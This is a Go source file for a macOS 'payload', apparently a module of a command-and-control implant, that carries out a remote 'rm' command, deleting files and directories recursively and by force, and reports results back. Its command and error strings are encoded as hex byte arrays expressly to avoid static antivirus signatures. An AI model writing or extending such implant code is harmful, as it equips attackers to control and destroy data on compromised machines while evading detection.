// server/docker/payloads/Darwin/action_rm.go

//go:build darwin
// +build darwin

package main

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"
)

// RM strings (constructed to avoid static signatures)
var (
	// Flag arguments
	rmFlagRecursive = string([]byte{0x2d, 0x2d, 0x72, 0x65, 0x63, 0x75, 0x72, 0x73, 0x69, 0x76, 0x65}) // --recursive
	rmFlagForce     = string([]byte{0x2d, 0x2d, 0x66, 0x6f, 0x72, 0x63, 0x65})                         // --force

	// Command name
	rmCmdName = string([]byte{0x72, 0x6d}) // rm

	// Error pattern strings for parseRemovalError
	rmErrPermDenied    = string([]byte{0x70, 0x65, 0x72, 0x6d, 0x69, 0x73, 0x73, 0x69, 0x6f, 0x6e, 0x20, 0x64, 0x65, 0x6e, 0x69, 0x65, 0x64})                                                             // permission denied
	rmErrDirNotEmpty   = string([]byte{0x64, 0x69, 0x72, 0x65, 0x63, 0x74, 0x6f, 0x72, 0x79, 0x20, 0x6e, 0x6f, 0x74, 0x20, 0x65, 0x6d, 0x70, 0x74, 0x79})                                                 // directory not empty
	rmErrResBusy       = string([]byte{0x72, 0x65, 0x73, 0x6f, 0x75, 0x72, 0x63, 0x65, 0x20, 0x62, 0x75, 0x73, 0x79})                                                                                     // resource busy
	rmErrDevResBusy    = string([]byte{0x64, 0x65, 0x76, 0x69, 0x63, 0x65, 0x20, 0x6f, 0x72, 0x20, 0x72, 0x65, 0x73, 0x6f, 0x75, 0x72, 0x63, 0x65, 0x20, 0x62, 0x75, 0x73, 0x79})                         // device or resource busy
	rmErrReadOnly      = string([]byte{0x72, 0x65, 0x61, 0x64, 0x2d, 0x6f, 0x6e, 0x6c, 0x79, 0x20, 0x66, 0x69, 0x6c, 0x65, 0x20, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d})                                     // read-only file system
	rmErrOpNotPermit   = string([]byte{0x6f, 0x70, 0x65, 0x72, 0x61, 0x74, 0x69, 0x6f, 0x6e, 0x20, 0x6e, 0x6f, 0x74, 0x20, 0x70, 0x65, 0x72, 0x6d, 0x69, 0x74, 0x74, 0x65, 0x64})                         // operation not permitted
)

// RmCommand handles file and directory removal
type RmCommand struct{}

func (c *RmCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	// Check if no arguments provided
	if len(args) == 0 {
		return CommandResult{
			Output:      Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Parse flags
	recursive := false
	force := false
	var targets []string

	for _, arg := range args {
		// Check for combined flags like -rf or -fr
		if strings.HasPrefix(arg, "-") && !strings.HasPrefix(arg, "--") {
			flagStr := strings.TrimPrefix(arg, "-")
			if strings.Contains(flagStr, "r") || strings.Contains(flagStr, "R") {
				recursive = true
			}
			if strings.Contains(flagStr, "f") {
				force = true
			}
			// Check for individual flags
			if flagStr == "r" || flagStr == "R" {
				recursive = true
			} else if flagStr == "f" {
				force = true
			}
		} else if arg == rmFlagRecursive {
			recursive = true
		} else if arg == rmFlagForce {
			force = true
		} else {
			// It's a target file/directory
			targets = append(targets, arg)
		}
	}

	// Check if we have any targets to remove
	if len(targets) == 0 {
		return CommandResult{
			Output:      Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Get current working directory from context
	ctx.mu.RLock()
	workingDir := ctx.WorkingDir
	ctx.mu.RUnlock()

	var output strings.Builder
	var errors []string
	hasErrors := false
	successCount := 0

	// Process each target
	for _, target := range targets {
		var targetPath string

		if filepath.IsAbs(target) || strings.HasPrefix(target, "\\\\") || strings.HasPrefix(target, "//") {
			targetPath = target
		} else {
			// Handle UNC paths in working directory
			if strings.HasPrefix(workingDir, "\\\\") || strings.HasPrefix(workingDir, "//") {
				workingDirNorm := strings.ReplaceAll(workingDir, "/", "\\")
				if !strings.HasSuffix(workingDirNorm, "\\") {
					workingDirNorm += "\\"
				}
				targetPath = workingDirNorm + target
			} else {
				targetPath = filepath.Join(workingDir, target)
			}
		}

		// Clean path while preserving UNC
		if strings.HasPrefix(targetPath, "\\\\") || strings.HasPrefix(targetPath, "//") {
			targetPath = strings.ReplaceAll(targetPath, "/", "\\")
			parts := strings.Split(targetPath, "\\")
			var cleanParts []string
			for _, part := range parts {
				if part != "" && part != "." {
					cleanParts = append(cleanParts, part)
				}
			}
			if len(cleanParts) >= 2 {
				targetPath = "\\\\" + strings.Join(cleanParts, "\\")
			}
		} else {
			targetPath = filepath.Clean(targetPath)
		}

		// Check if the target exists
		// MODIFIED: Use NetworkAwareStatFile instead of os.Stat
		info, err := NetworkAwareStatFile(targetPath)
		if err != nil {
			if os.IsNotExist(err) {
				if !force {
					errors = append(errors, ErrCtx(E4, target))
					hasErrors = true
				}
				continue
			} else if os.IsPermission(err) {
				errors = append(errors, ErrCtx(E3, target))
				hasErrors = true
				continue
			} else {
				errors = append(errors, ErrCtx(E10, target))
				hasErrors = true
				continue
			}
		}

		// Check if it's a directory
		if info.IsDir() {
			if !recursive {
				errors = append(errors, ErrCtx(E6, target))
				hasErrors = true
				continue
			}

			// Remove directory recursively
			_, err := removeAllWithDetails(targetPath, force)
			if err != nil {
				errors = append(errors, ErrCtx(E11, target))
				hasErrors = true
			} else {
				output.WriteString(SuccCtx(S2, target) + "\n")
				successCount++
			}
		} else {
			// Remove single file
			// MODIFIED: Use NetworkAwareRemove instead of os.Remove
			err = NetworkAwareRemove(targetPath)
			if err != nil {
				if os.IsPermission(err) {
					errors = append(errors, ErrCtx(E3, target))
					hasErrors = true
				} else if !force {
					errors = append(errors, ErrCtx(E11, target))
					hasErrors = true
				}
			} else {
				output.WriteString(SuccCtx(S2, target) + "\n")
				successCount++
			}
		}
	}

	// Prepare final output
	finalOutput := output.String()

	if len(errors) > 0 {
		if finalOutput != "" {
			finalOutput += "\n"
		}
		finalOutput += strings.Join(errors, "\n")
	}

	if finalOutput == "" && !hasErrors {
		finalOutput = SuccCtx(S2, targets[0])
	}

	exitCode := 0
	if hasErrors {
		exitCode = 1
	}

	return CommandResult{
		Output:      finalOutput,
		ExitCode:    exitCode,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// Modified removeAllWithDetails function from action_rm.go
func removeAllWithDetails(path string, force bool) (int, error) {
	removedCount := 0

	// First, check if we can access the directory
	// MODIFIED: Use NetworkAwareOpenFile to open directory
	dir, err := NetworkAwareOpenFile(path, os.O_RDONLY, 0)
	if err != nil {
		if os.IsPermission(err) {
			return 0, fmt.Errorf(Err(E3))
		}
		return 0, err
	}

	// Read all directory entries
	entries, err := dir.Readdir(-1)
	dir.Close() // Close immediately after reading

	if err != nil {
		if os.IsPermission(err) {
			return 0, fmt.Errorf(Err(E3))
		}
		return 0, err
	}

	// Track errors during recursive deletion
	var lastError error

	// Remove all entries
	for _, entry := range entries {
		entryPath := filepath.Join(path, entry.Name())

		if entry.IsDir() {
			// Recursively remove subdirectory
			subCount, err := removeAllWithDetails(entryPath, force)
			removedCount += subCount

			if err != nil {
				lastError = err
				if !force {
					return removedCount, fmt.Errorf(ErrCtx(E11, entry.Name()))
				}
			} else {
				removedCount++ // Count the subdirectory itself
			}
		} else {
			// Remove file
			// MODIFIED: Use NetworkAwareRemove instead of os.Remove
			err := NetworkAwareRemove(entryPath)
			if err != nil {
				if os.IsPermission(err) {
					lastError = fmt.Errorf(ErrCtx(E3, entry.Name()))
				} else {
					lastError = err
				}

				if !force {
					return removedCount, fmt.Errorf(ErrCtx(E11, entry.Name()))
				}
			} else {
				removedCount++
			}
		}
	}

	// Now try to remove the empty directory
	// MODIFIED: Use NetworkAwareRemove instead of os.Remove
	err = NetworkAwareRemove(path)
	if err != nil {
		if os.IsPermission(err) {
			return removedCount, fmt.Errorf(Err(E3))
		}
		return removedCount, err
	}

	// If there was an error during processing but we still removed the directory,
	// report the success with a note about the error
	if lastError != nil && force {
		return removedCount, nil // In force mode, we consider it success if the directory is gone
	}

	return removedCount, nil
}

// parseRemovalError creates error codes for removal errors
func parseRemovalError(target string, err error) string {
	errStr := err.Error()

	if strings.Contains(errStr, rmErrPermDenied) || os.IsPermission(err) {
		return ErrCtx(E3, target)
	}

	if strings.Contains(errStr, rmErrDirNotEmpty) {
		return ErrCtx(E16, target)
	}

	if strings.Contains(errStr, rmErrResBusy) || strings.Contains(errStr, rmErrDevResBusy) {
		return ErrCtx(E13, target)
	}

	if strings.Contains(errStr, rmErrReadOnly) {
		return ErrCtx(E14, target)
	}

	if strings.Contains(errStr, rmErrOpNotPermit) {
		return ErrCtx(E15, target)
	}

	return ErrCtx(E11, target)
}
